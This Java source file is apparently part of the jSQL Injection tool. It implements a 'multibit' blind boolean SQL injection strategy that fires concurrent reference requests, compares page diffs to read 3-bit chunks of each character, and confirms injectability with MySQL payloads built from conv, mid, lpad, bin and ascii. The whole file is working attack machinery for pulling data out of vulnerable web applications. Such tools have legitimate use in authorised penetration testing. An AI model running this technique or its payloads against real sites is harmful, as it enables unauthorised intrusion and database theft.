package com.jsql.model.injection.strategy.blind;

import com.jsql.model.InjectionModel;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.injection.strategy.blind.patch.Diff;
import com.jsql.util.LogLevelUtil;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.*;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

/**
 * A blind attack class using concurrent threads.
 */
public class InjectionMultibit extends AbstractInjectionBoolean<CallableMultibit> {

    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();

    // Source code of the TRUE web page (usually ?id=1)
    private String sourceRef;

//    /**
//     * List of string differences found in all the FALSE queries, compared
//     * to the TRUE page (aka opcodes). Each FALSE pages should contain
//     * at least one same string, which shouldn't be present in all
//     * the TRUE queries.
//     */
    private List<Diff> diffsRefWithMultibitIds = new ArrayList<>();
    private List<List<Diff>> multibitIds = new ArrayList<>();

    /**
     * Create blind attack initialization.
     * If every false test are not in true mark and every true test are in
     * true test, then blind attack is confirmed.
     * @param blindMode
     */
    public InjectionMultibit(InjectionModel injectionModel, BooleanMode blindMode) {
        
        super(injectionModel, blindMode);
        
//        // No blind
//        if (this.falseTest.isEmpty() || this.injectionModel.isStoppedByUser()) {
//
//            return;
//        }
//
        // Call the SQL request which must be TRUE (usually ?id=1)
        this.sourceRef = this.callUrl("8", "multibit#ref");

        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetMultibitIds");

        Collection<CallableMultibit> listCallableMultibitIds = new ArrayList<>();

        for (int i = 0; i < 8 ; i++) {

            listCallableMultibitIds.add(
                new CallableMultibit(
                    ""+i,
                    this.injectionModel,
                    this,
                    this.booleanMode,
                    "multibit#ref~" + i
                )
            );
        }

        try {
            List<Future<CallableMultibit>> multibitIdRefs = taskExecutor.invokeAll(listCallableMultibitIds);

            taskExecutor.shutdown();

            if (!taskExecutor.awaitTermination(15, TimeUnit.SECONDS)) {

                taskExecutor.shutdownNow();
            }

            for (Future<CallableMultibit> multibitIdRef: multibitIdRefs) {

                List<Diff> a = multibitIdRef.get().getOpcodes();
                if (this.diffsRefWithMultibitIds.isEmpty()) {
                    this.diffsRefWithMultibitIds = new ArrayList<>(a);
                } else {
                    this.diffsRefWithMultibitIds.retainAll(a);
                }
                multibitIds.add(a);
            }

            for (List<Diff> multibitId : multibitIds) {

                multibitId.removeAll(this.diffsRefWithMultibitIds);
            }

        } catch (ExecutionException e) {

            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);

        } catch (InterruptedException e) {

            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
            Thread.currentThread().interrupt();
        }
    }

    @Override
    public CallableMultibit getCallableSizeTest(String sqlQuery, int indexCharacter) {

        return new CallableMultibit(sqlQuery, indexCharacter, this.injectionModel, this, this.booleanMode, "size:" + indexCharacter);
    }

    @Override
    public CallableMultibit getCallableMultibitTest(String sqlQuery, int indexCharacter, int block) {
        return new CallableMultibit(sqlQuery, indexCharacter, block, this.injectionModel, this, this.booleanMode, "multi#" + indexCharacter + "." + block);
    }

    @Override
    public CallableMultibit getCallableBitTest(String sqlQuery, int indexCharacter, int bit) {

        return null;
    }

    @Override
    public boolean isInjectable() throws StoppedByUserSlidingException {
        
        if (this.injectionModel.isStoppedByUser()) {
            throw new StoppedByUserSlidingException();
        }

        var blindTest1 = new CallableMultibit(
            "'0'|conv(mid(lpad(bin(ascii('a')),8,'0'),1,3),2,10)",
            this.injectionModel,
            this,
            this.booleanMode,
            "multibit#confirm~1"
        );
        var blindTest2 = new CallableMultibit(
            "'0'|conv(mid(lpad(bin(ascii('a')),8,'0'),4,3),2,10)",
            this.injectionModel,
            this,
            this.booleanMode,
            "multibit#confirm~2"
        );
        var blindTest3 = new CallableMultibit(
            "'0'|conv(mid(lpad(bin(ascii('a')),8,'0'),7,3),2,10)",
            this.injectionModel,
            this,
            this.booleanMode,
            "multibit#confirm~3"
        );

        try {
            blindTest1.call();
            blindTest2.call();
            blindTest3.call();
        } catch (Exception e) {
            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
        }

        return blindTest1.getIdPage() == 3 && blindTest2.getIdPage() == 0 && blindTest3.getIdPage() == 1;
    }

    @Override
    public String getInfoMessage() {
        
        return
            "Multibit strategy: a request is true if the diff between"
            + " a correct page (e.g existing id) and current page"
            + " is not as the following: "
//            + this.constantFalseMark
        ;
    }
    
    
    // Getter and setter

    public String getSourceRef() {
        return this.sourceRef;
    }

    public List<Diff> getDiffsRefWithMultibitIds() {
        return this.diffsRefWithMultibitIds;
    }

    public List<List<Diff>> getMultibitIds() {
        return multibitIds;
    }
}
